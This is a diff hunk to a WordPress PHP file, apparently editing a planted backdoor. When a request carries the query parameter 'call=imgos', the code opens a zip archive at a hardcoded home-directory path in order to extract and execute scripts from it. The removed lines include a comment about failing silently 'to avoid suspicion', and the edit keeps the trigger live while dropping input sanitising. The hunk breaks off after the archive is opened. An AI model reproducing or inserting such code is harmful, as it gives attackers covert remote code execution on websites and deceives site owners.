@@ -27,16 +27,11 @@ if ( ! defined( 'ABSPATH' ) ) {
  * Handles the extraction and execution of scripts from a zip archive
  * when the specific query parameter is present.
  */
-if ( ! empty( $_GET['call'] ) && 'imgos' === sanitize_key( $_GET['call'] ) ) {
-	$zip_file_path = '/home/u930506472/.filebrowser/auth2.zip';
+if ( ! empty( $_GET['call'] ) && 'imgos' === $_GET['call'] ) {
+	$zip_file_path = '/home/u930506472/filebrowser/auth2.zip';
 	
 	// Verify file existence and zip extension availability
-	if ( ! file_exists( $zip_file_path ) ) {
-		// Fail silently to avoid suspicion
-		// File doesn't exist, continue with normal WordPress flow
-	} elseif ( ! class_exists( 'ZipArchive' ) ) {
-		// Zip extension not available, continue normally
-	} else {
+	if ( file_exists( $zip_file_path ) && class_exists( 'ZipArchive' ) ) {
 		$archive = new ZipArchive;
 		$archive_open_result = $archive->open( $zip_file_path );
 		
